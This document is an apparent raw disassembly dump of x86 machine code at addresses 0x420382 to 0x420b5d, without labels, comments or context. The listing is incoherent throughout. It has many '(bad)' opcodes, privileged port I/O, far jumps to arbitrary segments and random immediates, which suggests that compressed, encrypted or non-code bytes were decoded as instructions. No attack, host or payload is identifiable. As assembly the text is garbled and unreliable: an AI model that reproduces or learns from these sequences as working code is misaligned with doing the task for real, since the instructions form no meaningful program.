  420382:	sbb    eax,0xe6b5ef3f
  420387:	(bad)
  42038b:	dec    edi
  42038c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42038e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42038f:	(bad)  [eax]
  420391:	inc    esp
  420392:	clc    
  420393:	mov    esp,0x716328ad
  420398:	pop    edx
  420399:	pop    esp
  42039a:	dec    edx
  42039b:	inc    ebx
  42039c:	neg    ebx
  42039e:	push   0xf3be419f
  4203a3:	out    dx,eax
  4203a4:	push   ebx
  4203a5:	xchg   edi,eax
  4203a6:	mul    ch
  4203a8:	(bad)  
  4203a9:	push   ebx
  4203aa:	mov    al,0x17
  4203ac:	int3   
  4203ad:	imul   ebp,DWORD PTR [ecx],0xcf03322f
  4203b3:	retf   0x6d2b
  4203b6:	pop    ebp
  4203b7:	sub    esi,DWORD PTR [ebx+ebp*2+0xb31b5c]
  4203be:	xlat   BYTE PTR ds:[ebx]
  4203bf:	neg    BYTE PTR [edx-0x3]
  4203c2:	sbb    al,0x5b
  4203c4:	add    edi,DWORD PTR [eax+0x5563bf28]
  4203ca:	(bad)  
  4203cb:	mov    ?,ebx
  4203cd:	mov    dh,0x8
  4203cf:	cld    
  4203d0:	arpl   WORD PTR [edx-0x30],dx
  4203d3:	les    esp,FWORD PTR [edx-0x6d]
  4203d6:	(bad)  
  4203d9:	mov    ebp,0x86155e7d
  4203de:	jmp    0x420413
  4203e0:	pop    es
  4203e1:	jmp    0x4203e2
  4203e3:	pop    edx
  4203e4:	idiv   DWORD PTR [esi]
  4203e6:	das    
  4203e7:	cwde   
  4203e8:	pop    edi
  4203e9:	jmp    0x753e:0x73bffa30
  4203f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203f1:	(bad)  
  4203f3:	and    dl,BYTE PTR [esi-0x42]
  4203f6:	rol    BYTE PTR [ebx-0x2976a4bf],0x62
  4203fd:	mov    DWORD PTR [ecx+edi*4],eax
  420400:	xchg   esi,eax
  420401:	adc    al,BYTE PTR [ebx+0x11]
  420404:	ja     0x420419
  420406:	dec    edx
  420407:	jp     0x420485
  420409:	add    BYTE PTR [ebp-0x11],0x5c
  42040d:	pop    eax
  42040e:	mov    al,ds:0xf2c38dca
  420413:	add    BYTE PTR [ecx-0x2b],0x83
  420417:	fbstp  TBYTE PTR [ecx+0xe]
  42041a:	div    DWORD PTR [eax-0x546f0e36]
  420420:	mov    al,BYTE PTR ds:0x9d8999e9
  420426:	or     dl,BYTE PTR [esi]
  420428:	lock ficomp DWORD PTR [ebx-0x7679f192]
  42042f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420430:	push   ecx
  420431:	ficom  DWORD PTR [ebp+0x21]
  420434:	enter  0x6f99,0x8b
  420438:	mov    WORD PTR [eax],ss
  42043a:	or     cl,BYTE PTR [edi]
  42043c:	dec    esp
  42043d:	jnp    0x42045a
  42043f:	into   
  420440:	and    esi,DWORD PTR [esp+edx*8+0x5329cb76]
  420447:	jbe    0x420431
  420449:	sub    eax,0xdde579ba
  42044e:	jns    0x42048c
  420450:	pop    ds
  420451:	mul    BYTE PTR [ebx-0x5969ab43]
  420457:	std    
  420458:	adc    BYTE PTR [esi-0x27],0x27
  42045c:	(bad)  
  42045d:	sub    DWORD PTR [ebx+0x7e],esi
  420460:	in     eax,0x4
  420462:	pop    esp
  420463:	dec    ebx
  420464:	xchg   esi,eax
  420465:	shl    BYTE PTR [esi+0x2c],cl
  420468:	call   0x7773:0xdb871e7b
  42046f:	xor    DWORD PTR [ebx],ebp
  420471:	jnp    0x4204ad
  420473:	scas   eax,DWORD PTR es:[edi]
  420474:	arpl   di,si
  420476:	dec    edx
  420477:	sbb    DWORD PTR [ebx-0x5bc80a9b],0xffffff97
  42047e:	sub    dh,BYTE PTR [ebp+0x54726260]
  420484:	mov    bh,0x59
  420486:	fcmove st,st(1)
  420488:	scas   al,BYTE PTR es:[edi]
  420489:	data16 jae 0x42044f
  42048c:	xchg   ebx,eax
  42048d:	stos   BYTE PTR es:[edi],al
  42048e:	fsub   DWORD PTR [ebx]
  420490:	dec    ebx
  420491:	jl     0x420429
  420493:	pop    eax
  420494:	push   0x75
  420496:	(bad)  
  420497:	push   esp
  420498:	mov    bh,0xf1
  42049a:	ja     0x420481
  42049c:	sub    al,0x6d
  42049e:	leave  
  42049f:	enter  0x7060,0xe2
  4204a3:	xchg   ebp,eax
  4204a4:	(bad)  
  4204a6:	fimul  DWORD PTR [ecx]
  4204a8:	(bad)  
  4204aa:	push   ds
  4204ab:	pop    edx
  4204ac:	fs cmp al,0xb9
  4204af:	bound  esp,QWORD PTR [edx]
  4204b1:	mov    DWORD PTR ds:0xad9a83b2,edx
  4204b7:	add    bh,bl
  4204b9:	scas   eax,DWORD PTR es:[edi]
  4204ba:	int    0xe5
  4204bc:	test   eax,0xd98debf1
  4204c1:	sub    ebp,DWORD PTR [eax-0x40185470]
  4204c7:	sub    al,0x52
  4204c9:	imul   esi,DWORD PTR [ecx+0x32],0x41856475
  4204d0:	pusha  
  4204d1:	mov    dl,al
  4204d3:	imul   eax,DWORD PTR [edx-0x1e8208b],0xfe854298
  4204dd:	jp     0x420465
  4204df:	sbb    BYTE PTR [edx-0x5e6fa4b0],dh
  4204e5:	inc    edx
  4204e6:	ja     0x42054f
  4204e8:	int3   
  4204e9:	enter  0x60f7,0x1c
  4204ed:	cdq    
  4204ee:	sub    BYTE PTR [eax+0x1a],ch
  4204f1:	out    0x70,al
  4204f3:	in     eax,0x8c
  4204f5:	sbb    bh,bl
  4204f7:	sbb    BYTE PTR [ecx+0x30143e29],ah
  4204fd:	push   edx
  4204fe:	sub    esi,0x69239e07
  420504:	push   ebx
  420505:	clc    
  420506:	xor    al,0x4b
  420508:	jecxz  0x420525
  42050a:	aaa    
  42050b:	addr16 add eax,0x6033baff
  420511:	pop    eax
  420512:	jp     0x4204f9
  420514:	mov    esp,0x98b69efc
  420519:	(bad)  
  42051a:	push   esp
  42051b:	std    
  42051c:	dec    esp
  42051d:	jbe    0x4204a0
  42051f:	or     eax,0x4ccaf818
  420524:	repz je 0x4204de
  420527:	mov    eax,ds:0x30a82812
  42052c:	cmp    al,0xb5
  42052e:	sbb    eax,0x46e1928c
  420533:	inc    edx
  420534:	sbb    ebp,DWORD PTR [ecx-0x7855ca6a]
  42053a:	addr16 sub eax,0x1d4a87a4
  420540:	pushf  
  420541:	add    BYTE PTR [edi],dl
  420543:	push   ebx
  420544:	adc    dl,al
  420546:	in     al,0x36
  420548:	pop    esi
  420549:	int    0x6e
  42054b:	loopne 0x42054a
  42054d:	mov    ch,0xfe
  42054f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420550:	popa   
  420551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420552:	inc    eax
  420553:	(bad)  
  420554:	adc    al,bl
  420556:	loopne 0x420503
  420558:	adc    al,0xe3
  42055a:	push   ebx
  42055b:	mov    ah,0xb9
  42055d:	(bad)  
  42055f:	cmp    BYTE PTR [ebx],ah
  420561:	test   al,0x93
  420563:	jecxz  0x420558
  420565:	jmp    0xf7ff:0xcb3bca54
  42056c:	out    dx,eax
  42056d:	add    eax,0xe081b599
  420572:	adc    ecx,DWORD PTR [eax]
  420574:	lods   eax,DWORD PTR ds:[esi]
  420575:	mov    ds:0x1dff0aa7,eax
  42057a:	mov    ebx,0x6c319245
  42057f:	rol    DWORD PTR [esi+0x59],cl
  420582:	scas   eax,DWORD PTR es:[edi]
  420583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420584:	push   edi
  420585:	dec    edi
  420586:	adc    eax,0x1416c41d
  42058b:	ficom  WORD PTR [esi-0x3]
  42058e:	mov    ebp,DWORD PTR [ebx+0x12]
  420591:	pop    edi
  420592:	hlt    
  420593:	enter  0x8541,0x86
  420597:	dec    esp
  420598:	lock mov bh,0x8d
  42059b:	dec    edx
  42059c:	add    BYTE PTR [ecx],bh
  42059e:	pop    ebx
  42059f:	in     al,0xbe
  4205a1:	xlat   BYTE PTR ds:[ebx]
  4205a2:	jecxz  0x42060b
  4205a4:	xchg   esi,eax
  4205a5:	retf   
  4205a6:	cdq    
  4205a7:	pop    eax
  4205a8:	push   cs
  4205a9:	(bad)  
  4205ab:	imul   ebp,DWORD PTR [ebx],0x7e
  4205ae:	push   edx
  4205af:	cmc    
  4205b0:	pop    esi
  4205b1:	add    al,0x54
  4205b3:	ja     0x420542
  4205b5:	(bad)  
  4205b7:	xchg   esi,eax
  4205b8:	js     0x4205fd
  4205ba:	jmp    0xa166:0x7c27427b
  4205c1:	jb     0x4205d1
  4205c3:	xlat   BYTE PTR ds:[ebx]
  4205c4:	sbb    BYTE PTR [edx+eiz*1-0x49a8771],bh
  4205cb:	pop    esi
  4205cc:	and    eax,0x5da732c6
  4205d1:	aad    0xfa
  4205d3:	neg    esp
  4205d5:	ror    DWORD PTR [ebx+0x2cf1d4cc],cl
  4205db:	jno    0x420569
  4205dd:	fisttp WORD PTR [edx+eax*1+0x6c04b095]
  4205e4:	cwde   
  4205e5:	sub    bh,ah
  4205e7:	repz mov ebx,0x956bd950
  4205ed:	std    
  4205ee:	test   BYTE PTR [edx+eax*4],0x43
  4205f2:	xchg   ch,dh
  4205f4:	and    eax,0xdd9dc12e
  4205f9:	aad    0xc2
  4205fb:	jl     0x4205a7
  4205fd:	jae    0x420661
  4205ff:	cli    
  420600:	into   
  420601:	fdivp  st(5),st
  420603:	and    DWORD PTR [ebp+0x595d7e2e],ecx
  420609:	test   BYTE PTR [ebx],0xf7
  42060c:	pop    eax
  42060d:	xchg   edx,eax
  42060e:	mov    ebx,0x4e3946d5
  420613:	mov    al,0x87
  420615:	push   ss
  420616:	and    DWORD PTR [ebp+0x1a85e9fb],ebp
  42061c:	mul    DWORD PTR [edi-0x20]
  42061f:	push   ss
  420620:	push   ds
  420621:	jmp    0x842550c5
  420626:	pop    esi
  420627:	mov    ebp,0xfc0a63c6
  42062c:	(bad)  
  42062d:	(bad)  
  42062f:	mov    ebx,DWORD PTR [ecx+0xb]
  420632:	cmp    DWORD PTR [ecx],0xa5231623
  420638:	addr16 mov bl,0x74
  42063b:	loope  0x42067e
  42063d:	push   cs
  42063e:	dec    edx
  42063f:	jp     0x420671
  420641:	push   ds
  420642:	enter  0x5b55,0x22
  420646:	inc    edx
  420647:	cmp    eax,0xa5f46c2f
  42064c:	out    dx,al
  42064d:	(bad)  
  42064e:	int3   
  42064f:	aam    0x7b
  420651:	push   es
  420652:	mov    eax,ds:0x110f07ad
  420657:	std    
  420658:	xchg   edi,eax
  420659:	or     eax,0x2e73f17d
  42065e:	rcr    BYTE PTR [ebp+0x6],cl
  420661:	setg   BYTE PTR [ecx]
  420664:	push   edx
  420665:	jp     0x42060a
  420667:	dec    ebp
  420668:	fild   WORD PTR [ebx+0x56c65e8f]
  42066e:	xor    ebx,DWORD PTR [esi+0x6f]
  420671:	cmp    DWORD PTR [bp+di],ebx
  420674:	add    dl,BYTE PTR [esi]
  420676:	arpl   ax,di
  420678:	sti    
  420679:	push   ebp
  42067a:	shr    dl,0x5f
  42067d:	fidiv  DWORD PTR [ebx]
  42067f:	jecxz  0x4206e8
  420681:	push   ebx
  420682:	inc    esi
  420683:	sti    
  420684:	jge    0x420677
  420686:	ror    BYTE PTR [esi+0x14],1
  420689:	mov    ebx,0x5d30795c
  42068e:	add    al,0xa5
  420690:	test   ecx,esp
  420692:	sub    ch,bh
  420694:	(bad)  
  420695:	jbe    0x42063a
  420697:	push   cs
  420698:	jmp    0x4206bd
  42069a:	enter  0xd96f,0xaf
  42069e:	repnz xchg edi,eax
  4206a0:	xor    eax,DWORD PTR [eax]
  4206a2:	mov    ds:0xe48b947e,al
  4206a7:	and    al,0x27
  4206a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206aa:	jp     0x4206a4
  4206ac:	sti    
  4206ad:	push   esi
  4206ae:	xlat   BYTE PTR ds:[ebx]
  4206af:	in     al,0xcd
  4206b1:	aaa    
  4206b2:	jle    0x42067d
  4206b4:	dec    esp
  4206b5:	popa   
  4206b6:	adc    edx,ecx
  4206b8:	or     BYTE PTR [eax],bl
  4206ba:	repz push edi
  4206bc:	push   edi
  4206bd:	xor    edx,ecx
  4206bf:	cld    
  4206c0:	or     BYTE PTR [ebx+0x48],ah
  4206c3:	pop    ecx
  4206c4:	stos   BYTE PTR es:[edi],al
  4206c5:	jmp    0x4206a8
  4206c7:	mov    ebx,0xcb2a2257
  4206cc:	pop    ecx
  4206cd:	xchg   edx,eax
  4206ce:	adc    ecx,edi
  4206d0:	inc    edx
  4206d1:	mov    eax,0x7f517e84
  4206d6:	xor    dl,BYTE PTR es:[eax+0x42]
  4206da:	cmc    
  4206db:	test   al,0xed
  4206dd:	inc    edi
  4206de:	push   ebp
  4206df:	and    esi,esp
  4206e1:	add    al,0x26
  4206e3:	cli    
  4206e4:	mov    ds:0x5377d886,al
  4206e9:	jle    0x420680
  4206eb:	retf   
  4206ec:	loop   0x420717
  4206ee:	mov    edx,0xe8e9e062
  4206f3:	fimul  WORD PTR [esi+0x466d5862]
  4206f9:	mov    ebx,0xfb65a557
  4206fe:	daa    
  4206ff:	mov    ah,0xc9
  420701:	shl    DWORD PTR [ebp+0x21],cl
  420704:	mov    ecx,0x6ff607fb
  420709:	jmp    0xf69542c9
  42070e:	jns    0x420736
  420710:	mov    bl,BYTE PTR [edx-0x79]
  420713:	jmp    0x20f8c9e5
  420718:	jg     0x4206b2
  42071a:	rcr    BYTE PTR [ecx-0x20048029],0xb0
  420721:	mov    ah,0x8e
  420723:	in     al,dx
  420724:	push   ss
  420725:	lock mov esi,0xc3243b97
  42072b:	jmp    0x4206e3
  42072d:	mov    ah,0xef
  42072f:	cmp    edi,DWORD PTR ds:0x1be9a423
  420735:	outs   dx,DWORD PTR ds:[esi]
  420736:	dec    ebx
  420737:	hlt    
  420738:	out    dx,al
  420739:	jge    0x4206ce
  42073b:	popa   
  42073c:	xor    al,0x0
  42073e:	cmp    ebp,DWORD PTR [edi+ebp*1]
  420741:	pop    esp
  420742:	cli    
  420743:	jg     0x4206c7
  420745:	inc    eax
  420746:	pop    ebx
  420747:	lds    esp,FWORD PTR [edi-0x1ae08d8]
  42074d:	iret   
  42074e:	in     al,0xd5
  420750:	adc    al,0x5e
  420752:	xlat   BYTE PTR ds:[ebx]
  420753:	add    DWORD PTR [edx+0x2d993bfb],ebx
  420759:	and    DWORD PTR [edx],edx
  42075b:	loope  0x4207b5
  42075d:	adc    DWORD PTR [edi+0x4c],esp
  420760:	push   edx
  420761:	push   ebp
  420762:	inc    ebp
  420763:	bound  ebp,QWORD PTR [esi]
  420765:	retf   
  420766:	in     eax,0x91
  420768:	aaa    
  420769:	mov    dl,0x44
  42076b:	pop    edx
  42076c:	xchg   ebx,eax
  42076d:	cwde   
  42076e:	push   ds
  42076f:	ins    DWORD PTR es:[edi],dx
  420770:	push   ss
  420771:	mov    esp,0xcfd84ca0
  420776:	(bad)  
  420777:	loop   0x42073c
  420779:	ret    0x4002
  42077c:	lahf   
  42077d:	adc    DWORD PTR [ebx-0x6e78282b],0x4f0c525d
  420787:	or     BYTE PTR [esi],0x1
  42078a:	leave  
  42078b:	scas   eax,DWORD PTR es:[edi]
  42078c:	lods   eax,DWORD PTR ds:[esi]
  42078d:	dec    ebp
  42078e:	mov    eax,ds:0x4c5c05e6
  420793:	test   eax,0x639e3f32
  420799:	jo     0x4207d2
  42079b:	fwait
  42079c:	sbb    dl,al
  42079e:	outs   dx,BYTE PTR ds:[esi]
  42079f:	mov    ebp,0x903e340d
  4207a4:	hlt    
  4207a5:	and    ecx,DWORD PTR [edx+0x70]
  4207a8:	es mov dh,0xd6
  4207ab:	dec    edi
  4207ac:	ror    BYTE PTR [eax+0x1d0c4bdc],1
  4207b2:	push   edx
  4207b3:	sub    al,0xeb
  4207b5:	popa   
  4207b6:	fsub   st,st(5)
  4207b8:	push   cs
  4207b9:	(bad)
  4207bc:	pop    ebp
  4207bd:	xchg   ebx,eax
  4207be:	adc    al,ah
  4207c0:	in     eax,0xfb
  4207c2:	std    
  4207c3:	push   ecx
  4207c4:	sbb    dh,BYTE PTR [edx+0x4b]
  4207c7:	sbb    ah,BYTE PTR [edi+edi*2]
  4207ca:	adc    ch,cl
  4207cc:	or     BYTE PTR [edx-0x74],dl
  4207cf:	enter  0x5a6d,0x63
  4207d3:	mov    eax,0x763d3e66
  4207d8:	mov    bh,0x93
  4207da:	or     ecx,DWORD PTR [esi]
  4207dc:	inc    esi
  4207dd:	inc    eax
  4207de:	mov    dh,bh
  4207e0:	xchg   ecx,eax
  4207e1:	mov    edx,0x3150a7bf
  4207e6:	or     ebp,ebp
  4207e8:	and    BYTE PTR cs:[ebx+0x3f],0x86
  4207ed:	out    0x82,al
  4207ef:	fcom   QWORD PTR [edx+0x36]
  4207f2:	sbb    eax,0x4462c256
  4207f7:	push   esp
  4207f8:	xor    DWORD PTR [esi-0x5fc86e99],ecx
  4207fe:	fld    QWORD PTR [edx+0x66]
  420801:	or     ebx,eax
  420803:	in     al,0xcc
  420805:	mov    ch,0x48
  420807:	push   ebp
  420808:	jnp    0x4207e0
  42080a:	int    0xde
  42080c:	sbb    BYTE PTR [ecx+0x11],ah
  42080f:	inc    edi
  420810:	enter  0xf53a,0x95
  420814:	dec    esp
  420815:	add    edi,ecx
  420817:	pop    ecx
  420818:	loope  0x42085b
  42081a:	pop    eax
  42081b:	mov    edx,0x92bf3baf
  420820:	adc    bh,al
  420822:	jns    0x4207ce
  420824:	mov    esi,0xf55a1610
  420829:	pop    edi
  42082a:	loope  0x4207ce
  42082c:	sbb    DWORD PTR [ecx],edx
  42082e:	fcmovbe st,st(5)
  420830:	jmp    0xf87d:0xfc92d41f
  420837:	pusha  
  420838:	jmp    0xa153:0xe0f5b519
  42083f:	sbb    eax,0xd534fe0e
  420844:	in     eax,dx
  420845:	(bad)  
  420846:	pop    edi
  420847:	sub    edi,DWORD PTR [ebp+0x75]
  42084a:	add    esi,DWORD PTR [edi]
  42084c:	pushf  
  42084d:	sub    eax,0x9c2fc2fc
  420852:	jmp    0x420851
  420854:	xchg   edx,eax
  420855:	pop    edi
  420856:	and    eax,0x1a653356
  42085b:	lods   al,BYTE PTR ds:[esi]
  42085c:	jbe    0x4208da
  42085e:	xor    DWORD PTR [edi+eax*1],eax
  420861:	in     eax,dx
  420862:	das    
  420863:	sti    
  420864:	repnz dec ebx
  420866:	jmp    0x420876
  420868:	sbb    al,dl
  42086a:	mov    dl,0x84
  42086c:	sahf   
  42086d:	(bad)  
  42086e:	dec    esi
  42086f:	ds mov esp,0xc0af37c0
  420875:	add    eax,esi
  420877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420878:	aad    0x11
  42087a:	add    al,0xa0
  42087c:	scas   eax,DWORD PTR es:[edi]
  42087d:	sti    
  42087e:	stos   DWORD PTR es:[edi],eax
  42087f:	fisubr DWORD PTR [esp+eax*1-0x74649d61]
  420886:	xchg   edx,eax
  420887:	and    DWORD PTR [edx],ebx
  420889:	jae    0x42089a
  42088b:	pop    ds
  42088c:	cmp    bl,dh
  42088e:	cld    
  42088f:	push   esi
  420890:	sub    dh,BYTE PTR [ebx+ecx*8]
  420893:	inc    ecx
  420894:	jnp    0x42090d
  420896:	xchg   DWORD PTR [eax-0x7f951488],esi
  42089c:	not    dh
  42089e:	jb     0x4208e6
  4208a0:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4208a2:	sbb    BYTE PTR [ebx+0x78],ah
  4208a5:	(bad)  
  4208a6:	pop    esp
  4208a7:	(bad)  
  4208a8:	push   eax
  4208a9:	pushf  
  4208aa:	pmullw mm6,QWORD PTR [edx-0x67d97277]
  4208b1:	inc    ecx
  4208b2:	mov    ds:0x1e75106,al
  4208b7:	add    edx,ecx
  4208b9:	in     eax,0xfe
  4208bb:	mov    al,dl
  4208bd:	mov    dl,0x13
  4208bf:	add    ah,BYTE PTR [esi+0x10]
  4208c2:	cwde   
  4208c3:	and    DWORD PTR [ebx],esi
  4208c5:	inc    esp
  4208c6:	cmp    DWORD PTR [edx+0xd],0xd720062a
  4208cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208ce:	add    al,0xbc
  4208d0:	sbb    esp,ebp
  4208d2:	adc    edi,DWORD PTR [esi-0x34f37efe]
  4208d8:	or     DWORD PTR ds:0x9bb56213,esp
  4208de:	sbb    DWORD PTR [ebp+0x0],ebp
  4208e1:	xor    al,0xff
  4208e3:	std    
  4208e4:	les    esp,FWORD PTR [edi+ecx*1-0x6d]
  4208e8:	sahf   
  4208e9:	adc    BYTE PTR [ecx+esi*4+0xc564f4f],bl
  4208f0:	ror    dl,cl
  4208f2:	fwait
  4208f3:	test   eax,0x2d8c44ce
  4208f8:	cmp    al,dl
  4208fa:	lea    ebp,[eax+0x69b83966]
  420900:	push   es
  420901:	or     edx,DWORD PTR [ebp-0x46]
  420904:	mov    dl,0xa0
  420906:	push   esp
  420907:	es mov edi,0x81ab4034
  42090d:	mov    al,ds:0xcf454c8
  420912:	adc    cl,BYTE PTR gs:[ecx]
  420915:	cs lahf 
  420917:	xor    eax,0x110a687
  42091c:	mov    ebp,0xd9fb6a3f
  420921:	xor    eax,0x9839e9c7
  420926:	mov    cl,dh
  420928:	fst    DWORD PTR [esi-0xf3bdf87]
  42092e:	and    BYTE PTR [ecx+esi*4-0x14],dl
  420932:	jae    0x4208d3
  420934:	sbb    edx,DWORD PTR [esi+0x1f]
  420937:	mov    bl,0xaf
  420939:	and    ecx,ebp
  42093b:	push   ebx
  42093c:	jp     0x4208bf
  42093e:	add    eax,0x4525fba0
  420943:	or     al,0x57
  420945:	rcl    BYTE PTR [ebp+0xc012c26],1
  42094b:	jp     0x42091f
  42094d:	(bad)  
  42094e:	mov    eax,ds:0x3ec72bf5
  420953:	adc    al,0xb
  420955:	das    
  420956:	jle    0x4208ee
  420958:	pop    ebx
  420959:	cmc    
  42095a:	call   DWORD PTR [esi-0x36556de2]
  420960:	ret    0x182e
  420963:	cmp    eax,0x2ec2a3dc
  420968:	test   DWORD PTR [ebx],edi
  42096a:	push   ebx
  42096b:	or     ecx,DWORD PTR [ebp-0x1104cc5e]
  420971:	add    BYTE PTR ds:0x48d330bd,ch
  420977:	sbb    eax,0xd84f2ac7
  42097c:	pop    ds
  42097d:	push   ecx
  42097e:	mov    ds:0xbabe3e6d,eax
  420983:	int3   
  420984:	leave  
  420985:	mov    ds:0xdbeaed44,eax
  42098a:	ret    0x200e
  42098d:	cmp    al,0x7e
  42098f:	(bad)  
  420990:	cmp    al,0x4b
  420992:	cli    
  420993:	sar    BYTE PTR [ecx],1
  420995:	cmp    al,0x39
  420997:	enter  0x5c48,0xa7
  42099b:	gs test al,0x32
  42099e:	sbb    al,0x9f
  4209a0:	jl     0x420a18
  4209a2:	ins    BYTE PTR es:[edi],dx
  4209a3:	mov    ds:0x3a180f3,eax
  4209a8:	ins    DWORD PTR es:[edi],dx
  4209a9:	stos   DWORD PTR es:[edi],eax
  4209aa:	adc    edx,DWORD PTR [ebp+0x42e8942b]
  4209b0:	mov    dh,0x69
  4209b2:	mov    al,0x4b
  4209b4:	loope  0x420956
  4209b6:	mov    al,0xa4
  4209b8:	sbb    eax,0xbb20d53e
  4209bd:	repnz enter 0xbb09,0x64
  4209c2:	adc    dl,BYTE PTR [ebx]
  4209c4:	jns    0x4209ab
  4209c6:	test   BYTE PTR [ebx+ebp*1-0x2e],al
  4209ca:	sub    eax,0xbed37050
  4209cf:	test   al,0x6f
  4209d1:	bound  ecx,QWORD PTR [eax-0x6]
  4209d4:	lock pop eax
  4209d6:	fcom   QWORD PTR ds:0xa6ffc8e4
  4209dc:	dec    DWORD PTR [ebx+0x1f3d7fca]
  4209e2:	iret   
  4209e3:	dec    eax
  4209e4:	nop
  4209e5:	shr    DWORD PTR [ecx+0x6c],1
  4209e8:	inc    edx
  4209e9:	sub    BYTE PTR [ebx],ah
  4209eb:	ins    DWORD PTR es:[edi],dx
  4209ec:	(bad)  
  4209ed:	(bad)  
  4209ee:	gs loop 0x4209ae
  4209f1:	cmp    eax,0x12d15dc
  4209f6:	test   DWORD PTR [esi-0x285425fa],ebp
  4209fc:	les    edx,FWORD PTR [esi+0x4f975a8b]
  420a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a03:	xchg   edx,eax
  420a04:	fldenv [eax-0x2cb8e1a]
  420a0a:	leave  
  420a0b:	pop    ecx
  420a0c:	and    eax,0x98fa2c60
  420a11:	mov    BYTE PTR [ebx+edi*4],bh
  420a14:	popa   
  420a15:	xchg   edi,eax
  420a16:	enter  0x18d8,0xfc
  420a1a:	and    DWORD PTR [esi],esp
  420a1c:	pop    ebx
  420a1d:	(bad)  
  420a1e:	rol    BYTE PTR [esi],0xfa
  420a21:	add    BYTE PTR [esi-0x781f6727],bl
  420a27:	mov    cl,BYTE PTR ds:0xf866cd59
  420a2d:	js     0x420a92
  420a2f:	sbb    WORD PTR [ebx],0x61
  420a33:	cmp    al,0xf4
  420a35:	outs   dx,BYTE PTR ds:[esi]
  420a36:	(bad)  
  420a37:	mov    bl,0x5b
  420a39:	push   esp
  420a3a:	pushf  
  420a3b:	popa   
  420a3c:	inc    eax
  420a3d:	scas   eax,DWORD PTR es:[edi]
  420a3e:	xchg   esp,eax
  420a3f:	xor    ah,BYTE PTR [eax-0x166221d8]
  420a45:	test   eax,0xc19a2b0b
  420a4a:	cld    
  420a4b:	sub    eax,0xd67e5532
  420a50:	retf   
  420a51:	mov    ebp,0xb4f3cb87
  420a56:	test   al,0x79
  420a58:	loop   0x420a4d
  420a5a:	ret    
  420a5b:	ja     0x420a85
  420a5d:	retf   0x7cf7
  420a60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a62:	sub    al,0xa0
  420a64:	mov    al,BYTE PTR [edx+0x354375d8]
  420a6a:	pop    es
  420a6b:	mov    DWORD PTR [esi-0xdc26dc8],edi
  420a71:	dec    ebx
  420a72:	sbb    esi,eax
  420a74:	aad    0xd1
  420a76:	cld    
  420a77:	jns    0x420af1
  420a79:	jo     0x420a04
  420a7b:	retf   
  420a7c:	mov    al,0x57
  420a7e:	imul   ebx,ebx
  420a81:	jmp    0x420b02
  420a83:	jbe    0x420a85
  420a85:	mov    esi,0x5c819e99
  420a8a:	mov    ah,0x79
  420a8c:	nop
  420a8d:	push   ecx
  420a8e:	retf   0x810c
  420a91:	in     al,0xe
  420a93:	in     eax,0x1c
  420a95:	loopne 0x420ad9
  420a97:	mov    ebx,0xe50e92d8
  420a9c:	jmp    0x9c93edbf
  420aa1:	inc    edi
  420aa2:	aad    0x82
  420aa4:	(bad)  
  420aa5:	jne    0x420a77
  420aa7:	arpl   WORD PTR [ebx],si
  420aa9:	add    eax,0x21ba28f1
  420aae:	sub    ah,bl
  420ab0:	pop    ecx
  420ab1:	ins    DWORD PTR es:[edi],dx
  420ab2:	addr16 mov bl,0x26
  420ab5:	sbb    DWORD PTR [eax+0x3c0e58a4],ebp
  420abb:	inc    eax
  420abc:	scas   al,BYTE PTR es:[edi]
  420abd:	mov    DWORD PTR [edi-0x3a0b1959],esp
  420ac3:	arpl   WORD PTR [edi+0x655844d7],bp
  420ac9:	jl     0x420abf
  420acb:	fsubrp st(0),st
  420acd:	retf   0x7916
  420ad0:	in     eax,dx
  420ad1:	push   eax
  420ad2:	dec    ebp
  420ad3:	push   esi
  420ad4:	sbb    al,0x29
  420ad6:	jbe    0x420b44
  420ad8:	pop    esp
  420ad9:	scas   al,BYTE PTR es:[edi]
  420ada:	sbb    al,0x1a
  420adc:	ficomp WORD PTR [edx-0x4ab200d9]
  420ae2:	mov    ah,0x7f
  420ae4:	imul   edi,edi,0xffffffea
  420ae7:	sub    ch,BYTE PTR [ecx+ebp*1+0x1b482b92]
  420aee:	inc    edi
  420aef:	or     bh,BYTE PTR [ebx+eax*1-0x6d]
  420af3:	cld    
  420af4:	shl    DWORD PTR [eax+ebx*1+0xec17002],cl
  420afb:	in     eax,0x44
  420afd:	mov    ebx,0x4f6b2678
  420b02:	pop    esi
  420b03:	and    al,bh
  420b05:	std    
  420b06:	repz inc ebp
  420b08:	je     0x420b58
  420b0a:	or     dl,BYTE PTR [edx+0xe7ab53d]
  420b10:	(bad)  
  420b11:	mov    esp,0x882a0c6b
  420b16:	push   ds
  420b17:	dec    edx
  420b18:	mov    DWORD PTR es:0x5b4b9c17,edi
  420b1f:	loope  0x420b1a
  420b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b22:	mov    al,0x45
  420b24:	add    al,al
  420b26:	mov    bh,0x85
  420b28:	adc    BYTE PTR [ebp+0x2a1987f8],dl
  420b2e:	jmp    0x420b50
  420b30:	repz repnz fwait
  420b33:	mov    ds:0x4a26246a,al
  420b38:	and    eax,DWORD PTR [ebp-0x49]
  420b3b:	sbb    ch,BYTE PTR [edx+0x7352b36e]
  420b41:	pcmpgtb mm3,QWORD PTR [edx]
  420b44:	retf   
  420b45:	or     al,0x7a
  420b47:	mov    esp,0xf2d535fa
  420b4c:	mov    eax,0x81f7b2eb
  420b51:	clc    
  420b52:	xchg   esp,eax
  420b53:	dec    ebx
  420b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b55:	pop    ebx
  420b56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b57:	jns    0x420b76
  420b59:	add    BYTE PTR [edi+edi*4-0x7],bh
  420b5d:	lds    ebx,FWORD PTR [edx+0x4b46c5c9]
